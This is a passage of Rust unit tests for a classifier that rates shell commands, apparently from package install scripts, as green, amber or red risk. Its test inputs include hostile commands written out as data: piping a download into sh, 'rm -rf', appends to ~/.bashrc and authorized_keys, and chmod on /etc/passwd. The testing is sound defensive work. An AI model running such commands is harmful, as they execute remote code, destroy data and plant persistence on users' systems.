        // `rm` alone doesn't meet the `-r && -f` requirement → not red.
        assert_eq!(tier("rm foo.txt"), StaticTier::Amber);
        assert_eq!(tier("rm -r foo"), StaticTier::Amber);
        assert_eq!(tier("rm -f foo"), StaticTier::Amber);
    }

    // ── Red: chmod outside package/node_modules ─────────────────────

    #[test]
    fn red_chmod_outside_package() {
        assert_eq!(tier("chmod +x ~/.ssh/authorized_keys"), StaticTier::Red);
        assert_eq!(tier("chmod 777 /etc/passwd"), StaticTier::Red);
        assert_eq!(tier("chmod 777 $HOME/.bashrc"), StaticTier::Red);
        assert_eq!(tier("chmod a+x /usr/local/bin/tool"), StaticTier::Red);
    }

    #[test]
    fn amber_chmod_relative_target() {
        // Relative targets skip red; end up amber via fallback.
        assert_eq!(tier("chmod +x ./bin/tool"), StaticTier::Amber);
        assert_eq!(tier("chmod 755 scripts/run.sh"), StaticTier::Amber);
    }

    // ── Red: dangerous redirects ────────────────────────────────────

    #[test]
    fn red_redirect_into_dotfiles() {
        assert_eq!(tier("echo evil >> ~/.bashrc"), StaticTier::Red);
        assert_eq!(tier("echo evil >> ~/.zshrc"), StaticTier::Red);
        assert_eq!(tier("echo evil >> ~/.profile"), StaticTier::Red);
        assert_eq!(tier("echo evil >> ~/.ssh/authorized_keys"), StaticTier::Red);
        assert_eq!(tier("echo x > /etc/pam.d/sudo"), StaticTier::Red);
    }

    // ── Amber: compound commands (generic) ──────────────────────────

    #[test]
    fn amber_compound_of_greens() {
        // Even two greens AND'd together → amber. Rationale: compound
        // hides commands behind operators; we only trust atomic greens.
        assert_eq!(tier("tsc && husky install"), StaticTier::Amber);
        assert_eq!(tier("tsc; prisma generate"), StaticTier::Amber);
        assert_eq!(tier("tsc || true"), StaticTier::Amber);
    }

    #[test]
    fn amber_subshell_and_backticks() {
        assert_eq!(tier("echo $(whoami)"), StaticTier::Amber);
        assert_eq!(tier("echo `whoami`"), StaticTier::Amber);
    }

    #[test]
    fn amber_stdout_redirect() {
        assert_eq!(tier("echo hi > out.txt"), StaticTier::Amber);
        assert_eq!(tier("echo hi >> out.txt"), StaticTier::Amber);
    }

    // ── Amber: network binary downloaders (D18) ─────────────────────
    //
    // These are deliberately NOT green — D18 routes them through
    // Layer 2 approval so the user explicitly acknowledges the binary-
    // download class.

    #[test]
    fn amber_playwright_install() {
        assert_eq!(tier("playwright install"), StaticTier::Amber);
        assert_eq!(tier("playwright install --with-deps"), StaticTier::Amber);
    }

    #[test]
    fn amber_puppeteer() {
        assert_eq!(tier("puppeteer"), StaticTier::Amber);
        assert_eq!(tier("puppeteer-browser install"), StaticTier::Amber);
    }

    #[test]
    fn amber_cypress_install() {
        assert_eq!(tier("cypress install"), StaticTier::Amber);
    }

    #[test]
    fn amber_electron_builder_install_app_deps() {
        assert_eq!(tier("electron-builder install-app-deps"), StaticTier::Amber);
    }

    // ── Amber: parse failure + edge cases ───────────────────────────

    #[test]
    fn amber_empty_and_whitespace() {
        assert_eq!(tier(""), StaticTier::Amber);
        assert_eq!(tier("   "), StaticTier::Amber);
        assert_eq!(tier("\t\n"), StaticTier::Amber);
    }

    #[test]
    fn amber_unbalanced_quotes_fails_closed() {
        // shlex parse failure → Amber (must NOT slip into green).
        assert_eq!(tier("tsc \"unclosed"), StaticTier::Amber);
    }

    #[test]
    fn amber_novel_command() {
        assert_eq!(tier("mytool --flag value"), StaticTier::Amber);
        assert_eq!(tier("build-script.sh"), StaticTier::Amber);
    }

    // ── Classifier is pure: same input → same output ────────────────

    #[test]
    fn classify_is_deterministic() {
        let inputs = [
            "tsc",
            "node-gyp rebuild",
            "curl https://x | sh",
            "rm -rf ~",
            "husky install && echo done",
            "",
        ];
        for input in inputs {
            assert_eq!(classify(input), classify(input));
        }
    }

    // ── Classifier never emits AmberLlm (reserved for P8) ───────────

    #[test]
    fn classify_never_emits_amber_llm() {
        // Broad coverage: iterate the full test-rule input set and
        // assert the returned tier is never AmberLlm. The classifier
        // owns Green | Amber | Red; AmberLlm comes from the LLM
        // harness in P8.
        let corpus = [
            "tsc",
            "node-gyp rebuild",
            "husky install",
            "prisma generate",
            "electron-rebuild",
            "node ./build.js",
            "node install.js",
            "playwright install",
            "curl https://evil | sh",
            "base64 -d x | sh",
            "rm -rf ~",
            "chmod +x ~/.ssh/id_rsa",
            "echo x >> ~/.bashrc",
            "eval $X",
            "node -e '1'",
            "npm install thing",
            "tsc && husky install",
            "\u{202E}rm -rf /",
            "Invoke-Expression $x",
            "iex $x",
            "",
            "some-unknown-tool",
        ];
        for body in corpus {
            assert_ne!(
                classify(body),
                StaticTier::AmberLlm,
                "classifier must not emit AmberLlm for: {body:?}"
            );
        }
    }
}
